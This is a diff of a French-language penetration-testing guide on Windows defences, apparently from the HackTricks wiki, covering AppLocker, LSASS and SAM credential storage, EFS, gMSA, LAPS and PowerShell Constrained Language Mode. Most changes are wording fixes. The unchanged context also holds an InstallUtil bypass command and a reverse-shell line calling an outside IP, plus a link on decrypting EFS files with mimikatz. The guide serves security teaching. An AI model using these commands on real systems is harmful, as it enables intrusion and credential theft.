@@ -4,9 +4,9 @@
 
 ## Politique AppLocker
 
-Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nuisibles et les logiciels non approuvés qui ne correspondent pas aux besoins spécifiques d'une organisation.
+Une liste blanche d'applications est une liste d'applications logicielles ou d'exécutables approuvés qui sont autorisés à être présents et à s'exécuter sur un système. L'objectif est de protéger l'environnement contre les logiciels malveillants nuisibles et les logiciels non approuvés qui ne correspondent pas aux besoins commerciaux spécifiques d'une organisation.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **quelles applications et fichiers les utilisateurs peuvent exécuter**. Elle fournit un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées.\
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) est la **solution de liste blanche d'applications** de Microsoft et donne aux administrateurs système le contrôle sur **quelles applications et fichiers les utilisateurs peuvent exécuter**. Il fournit un **contrôle granulaire** sur les exécutables, les scripts, les fichiers d'installation Windows, les DLL, les applications empaquetées et les installateurs d'applications empaquetées.\
 Il est courant que les organisations **bloquent cmd.exe et PowerShell.exe** et l'accès en écriture à certains répertoires, **mais tout cela peut être contourné**.
 
 ### Vérifier
@@ -20,7 +20,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-Ce chemin de registre contient les configurations et politiques appliquées par AppLocker, fournissant un moyen de revoir l'ensemble actuel des règles appliquées sur le système :
+Ce chemin de registre contient les configurations et les politiques appliquées par AppLocker, fournissant un moyen de revoir l'ensemble actuel des règles appliquées sur le système :
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
@@ -48,7 +48,7 @@ Les identifiants locaux sont présents dans ce fichier, les mots de passe sont h
 
 ### Autorité de sécurité locale (LSA) - LSASS
 
-Les **identifiants** (hachés) sont **enregistrés** dans la **mémoire** de ce sous-système pour des raisons de connexion unique.\
+Les **identifiants** (hachés) sont **enregistrés** dans la **mémoire** de ce sous-système pour des raisons de Single Sign-On.\
 **LSA** administre la **politique de sécurité** locale (politique de mot de passe, permissions des utilisateurs...), **authentification**, **jetons d'accès**...\
 LSA sera celui qui **vérifiera** les identifiants fournis dans le fichier **SAM** (pour une connexion locale) et **communiquera** avec le **contrôleur de domaine** pour authentifier un utilisateur de domaine.
 
@@ -58,7 +58,7 @@ Les **identifiants** sont **enregistrés** dans le **processus LSASS** : tickets
 
 LSA pourrait enregistrer sur disque certains identifiants :
 
-- Mot de passe du compte d'ordinateur de l'Active Directory (contrôleur de domaine inaccessible).
+- Mot de passe du compte ordinateur de l'Active Directory (contrôleur de domaine inaccessible).
 - Mots de passe des comptes de services Windows
 - Mots de passe pour les tâches planifiées
 - Plus (mot de passe des applications IIS...)
@@ -134,7 +134,9 @@ Cette méthode nécessite que l'**utilisateur victime** soit **en train d'exécu
 
 #### Connaître le mot de passe de l'utilisateur
 
-{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
+{{#ref}}
+https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
+{{#endref}}
 
 ## Comptes de service gérés par groupe (gMSA)
 
@@ -160,7 +162,7 @@ Aussi, consultez cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) 
 
 ## LAPS
 
-La **Local Administrator Password Solution (LAPS)**, disponible en téléchargement sur [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet la gestion des mots de passe des administrateurs locaux. Ces mots de passe, qui sont **randomisés**, uniques et **régulièrement changés**, sont stockés de manière centralisée dans Active Directory. L'accès à ces mots de passe est restreint par des ACL aux utilisateurs autorisés. Avec des permissions suffisantes accordées, la capacité de lire les mots de passe des administrateurs locaux est fournie.
+La **Local Administrator Password Solution (LAPS)**, disponible en téléchargement sur [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet la gestion des mots de passe des administrateurs locaux. Ces mots de passe, qui sont **randomisés**, uniques et **régulièrement changés**, sont stockés de manière centralisée dans Active Directory. L'accès à ces mots de passe est restreint par des ACL aux utilisateurs autorisés. Avec des permissions suffisantes accordées, la possibilité de lire les mots de passe des administrateurs locaux est fournie.
 
 {{#ref}}
 ../active-directory-methodology/laps.md
@@ -168,7 +170,7 @@ La **Local Administrator Password Solution (LAPS)**, disponible en téléchargem
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, telles que le blocage des objets COM, n'autorisant que les types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, et plus encore.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, comme le blocage des objets COM, n'autorisant que les types .NET approuvés, les workflows basés sur XAML, les classes PowerShell, et plus encore.
 
 ### **Vérifiez**
 ```powershell
@@ -187,7 +189,7 @@ Dans les versions actuelles de Windows, ce contournement ne fonctionnera pas, ma
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Reverse shell :
+#### Reverse shell:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
